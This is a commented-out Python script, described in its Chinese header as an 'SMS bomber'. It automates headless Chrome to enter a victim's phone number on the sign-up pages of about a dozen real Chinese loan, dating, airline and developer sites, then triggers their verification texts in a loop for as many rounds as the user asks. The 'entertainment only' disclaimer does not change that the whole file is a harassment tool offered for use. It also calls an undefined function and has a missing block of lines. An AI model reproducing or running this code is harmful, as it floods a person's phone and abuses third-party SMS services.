# #  ===========================
# # -*- coding:utf-8 -*-
# # Time :2022/3/4 15:28
# # Author :黄丹丹
# # QQ:915155536
# # File :my_joke.py
# #  ===========================

# Python 实现短信轰炸机
# 原理其实很简单，就是利用selenium包打开各种网站的注册页，输入轰炸的号码，实现轰炸。其实也算是利用了注册漏洞。申明：仅娱乐使用，禁止🈲️用于非法用途！若用于非法用途，后果及法律责任博主一律不承担
#
# 复制代码
# 1 from selenium import webdriver
# 2 from selenium.webdriver import ActionChains
# 3 import time
# 4 import threading
# 5
# 6 #360借条
# 7 def send_360(phon_num):
#     8     option = webdriver.ChromeOptions()
# 9     option.add_argument('headless')
# 10     browser = webdriver.Chrome(chrome_options=option)
# 11     browser.get('https://www.360jie.com.cn/')
# 12     browser.find_element_by_name("mobile").send_keys(phon_num)
# 13     browser.find_element_by_id('btnSendCode1').click()
# 14     time.sleep(5)
# 15     browser.close()
# 16
# 17 #拍拍贷
# 18 def send_paipai(phon_num):
# 19
# 20     option = webdriver.ChromeOptions()
# 21     option.add_argument('headless')
# 22     browser = webdriver.Chrome(chrome_options=option)
# 23     key = "8263abd"
# 24     browser.get("https://account.ppdai.com/pc/login")
# 25     browser.find_element_by_class_name("login_toRegister").click()
# 26     browser.find_element_by_name("Mobile").send_keys(phon_num)
# 27     browser.find_element_by_name("Password").send_keys(key)
# 28     browser.find_element_by_id("getvefydata").click()
# 29     time.sleep(5)
# 30     browser.close()
# 31

# 47 #瓜子二手车
# 48 def send_guazi(phon_num):
#     49     option = webdriver.ChromeOptions()
# 50     option.add_argument('headless')
# 51     browser = webdriver.Chrome()
# 52     browser.get('https://www.guazi.com/nanchong/')
# 53     time.sleep(1)
# 54     browser.find_element_by_xpath("//*[@class='close js-close-finance-pop']").click()
# 55     time.sleep(2)
# 56     browser.find_element_by_id('js-login-new').click()
# 57     time.sleep(1)
# 58     browser.find_element_by_name('phone').send_keys(phon_num)
# 59     time.sleep(1)
# 60     browser.find_element_by_class_name('get-code').click()
# 61     time.sleep(4)
# 62     browser.close()
# 63
# 64 #凤凰智信
# 65 def send_fenghuang(phon_num):
#     66     option = webdriver.ChromeOptions()
# 67     option.add_argument('headless')
# 68     browser = webdriver.Chrome(chrome_options=option)
# 69     browser.get('https://www.fengwd.com/')
# 70     time.sleep(1)
# 71     browser.find_element_by_xpath("//*[@class='top-bar-item login-tag']/a").click()
# 72     time.sleep(2)
# 73     browser.find_element_by_id('mobile_number').send_keys(phon_num)
# 74     browser.find_element_by_xpath("//*[@class='get-sms-captcha blue']").click()
# 75     time.sleep(4)
# 76     browser.close()
# 77
# 78 #众房宝
# 79 def send_zongfangbao(phon_num):
#     80     option = webdriver.ChromeOptions()
# 81     option.add_argument('headless')
# 82     browser = webdriver.Chrome(chrome_options=option)
# 83     browser.get('https://www.zonefang.com/member/common/register')
# 84     time.sleep(1)
# 85     browser.find_element_by_class_name('phone').send_keys(phon_num)
# 86     time.sleep(2)
# 87     browser.find_element_by_class_name('pwd').send_keys('123456ydsa')
# 88     time.sleep(1)
# 89     browser.find_element_by_xpath("//*[@class='send_msg hand']").click()
# 90     time.sleep(4)
# 91     browser.close()
# 92
# 93 #百合相亲网
# 94 def send_baihe(phon_num):
#     95     option = webdriver.ChromeOptions()
# 96     option.add_argument('headless')
# 97     browser = webdriver.Chrome(chrome_options=option)
# 98     browser.get('https://my.baihe.com/register/?spm=2.13.24.69.99')
# 99     time.sleep(1)
# 100     browser.find_element_by_id('account').send_keys(phon_num)
# 101     browser.find_element_by_id('mobileValiCode_btn').click()
# 102     time.sleep(4)
# 103     browser.close()
# 104
# 105 #四川航空
# 106 def send_sichuanair(phon_num):
#     107     option = webdriver.ChromeOptions()
# 108     option.add_argument('headless')
# 109     browser = webdriver.Chrome(chrome_options=option)
# 110     browser.get('http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
# 111     browser.find_element_by_name('mobilePhone').send_keys(phon_num)
# 112     time.sleep(1)
# 113     browser.find_element_by_id('sendSmsCode').click()
# 114     time.sleep(6)
# 115     browser.close()
# 116
# 117 #昆明航空
# 118 def send_airkunming(phon_num):
#     119     option = webdriver.ChromeOptions()
# 120     option.add_argument('headless')
# 121     browser = webdriver.Chrome(chrome_options=option)
# 122     browser.get('https://www.airkunming.com/#/user/register')
# 123     browser.find_element_by_id('mobile').send_keys(phon_num)
# 124     time.sleep(1)
# 125     browser.find_element_by_xpath("//*[@class='sms-code']").click()
# 126     time.sleep(4)
# 127     browser.close()
# 128
# 129 #有赞开放平台
# 130 def send_youzan(phon_num):
#     131     option = webdriver.ChromeOptions()
# 132     option.add_argument('headless')
# 133     browser = webdriver.Chrome(chrome_options=option)
# 134     browser.get('https://console.youzanyun.com/register')
# 135     browser.find_element_by_xpath("//*[@class = 'zent-input phone']").send_keys(phon_num)
# 136     time.sleep(1)
# 137     browser.find_element_by_xpath("//*[@class = 'sms-btn']").click()
# 138     time.sleep(4)
# 139     browser.close()
# 140
# 141 #安徽相亲网
# 142 def send_anhuixiangiqn(phon_num):
#     143     option = webdriver.ChromeOptions()
# 144     option.add_argument('headless')
# 145     browser = webdriver.Chrome(chrome_options=option)
# 146     browser.get('http://www.ahxiangqin.cn/index.php?c=passport&a=reg')
# 147     browser.find_element_by_name('mobile').send_keys([phon_num])
# 148     time.sleep(1)
# 149     #browser.find_element_by_class_name('action-send-mobile-code get').click()
# 150     browser.find_element_by_xpath("//*[@class = 'action-send-mobile-code get']").click()
# 151     time.sleep(4)
# 152     browser.close()
# 154 #我主良缘
# 155 def send_wozhuliangyuan(phon_num):
# 156     option = webdriver.ChromeOptions()
# 157     option.add_argument('headless')
# 158     browser = webdriver.Chrome(chrome_options=option)
# 159     browser.get('http://m.7799520.com/register.html')
# 160     browser.find_element_by_name('mobile').send_keys([phon_num])
# 161     time.sleep(1)
# 162     bu = browser.find_elements_by_tag_name('button')
# 163     for i in bu:
# 164         i.click()
# 165         time.sleep(2)
# 166     browser.close()
# 167
# 168 if __name__ == "__main__":
# 169     phon_num = input('输入轰炸的手机号:')
# 170     run_roll = input('轰炸循环次数:')
# 171     run_roll = int(run_roll)
# 172     for _ in range(run_roll):
# 173         #threading.Thread(target = send_baihe(phon_num)).start()
# 174         threading.Thread(target = send_360(phon_num)).start()
# 175         #threading.Thread(target = send_paipai(phon_num)).start()
# 176         threading.Thread(target = send_ele(phon_num)).start()
# 177         #threading.Thread(target = send_guazi(phon_num)).start()
# 178         threading.Thread(target = send_fenghuang(phon_num)).start()
# 179         #threading.Thread(target = send_zongfangbao(phon_num)).start()
# 180         threading.Thread(target = send_sichuanair(phon_num)).start()
# 181         threading.Thread(target = send_airkunming(phon_num)).start()
# 182         threading.Thread(target = send_youzan(phon_num)).start()
# 183         threading.Thread(target = send_anhuixiangiqn(phon_num)).start()
# 184         threading.Thread(target = send_wozhuliangyuan(phon_num)).start()
# 185         time.sleep(4)
